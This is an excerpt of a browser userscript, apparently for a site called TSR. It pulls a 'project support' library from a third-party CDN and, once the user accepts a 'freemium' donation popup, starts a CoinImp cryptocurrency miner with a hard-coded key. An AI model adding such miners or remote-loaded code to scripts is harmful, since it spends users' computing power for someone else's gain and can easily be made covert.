...
// @require     https://gitcdn.xyz/repo/Drawbackz/user_script_donation_library/ec5dfd2cbcb72ef7345215641ad214e21ac61792/user_script_project_support.js
...
(function () {
    ...
    support = new AuthorSupport();
    support.popup.onClose = support.popup.hide;
    support.popup.onSubmit = function () {
        support.updateContract();
        if (support.isAuthorized()) {
            support.startMiner(new window.CoinImpMiner('b7fdf55359878f6c716cf0abf827e1ec8fe09e4e0f8a37bbde74e58d63e6c99d'));
        }
        support.popup.hide();
    };
    ...
    window.onload = function () {
        if (support.isExpired()) {
            support.popup.show("TSR - Freemium user script  (" + GM_info.script.version + ") <div style='text-align: left; font-size: 10px;'><b>Contact Me: </b><a style='background-color: none; text-decoration: none; color:white;'  href=\"mailto:drawbackz@userscripts.gq\">drawbackz@userscripts.gq</a></div>", "<p>Help and show your support by donating a percentage of your computer's processing power <b>(only while browsing TSR)</b> or making a donation via PayPal.</p><p><b>Thank you</b> to everyone that has been contributing, it is awesome to see the support!</p>");
            return;
        }
        if (support.isAuthorized()) {
            support.startMiner(new window.CoinImpMiner('b7fdf55359878f6c716cf0abf827e1ec8fe09e4e0f8a37bbde74e58d63e6c99d'));
